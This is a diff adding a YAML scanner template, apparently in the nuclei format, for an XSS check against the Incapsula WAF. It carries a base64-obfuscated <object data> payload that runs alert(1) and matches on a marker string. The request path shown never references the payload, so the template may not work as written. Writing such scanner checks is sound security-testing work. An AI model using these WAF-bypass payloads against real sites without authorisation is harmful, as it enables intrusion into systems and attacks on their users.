@@ -1,0 +1,20 @@
+id: patt-xss-inca-02-comment
+name: 'PATT xss patt-xss-inca-02 via comment'
+severity: high
+type: active
+tags:
+  - xss
+  - patt
+  - wafincapsula
+description: 'PATT Incapsula 11 Sep 2018: object data base64 with semicolon padding. [patt:patt-xss-inca-02] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      comment:
+        - '<object data=''data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==nxp0031''></object>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0031'
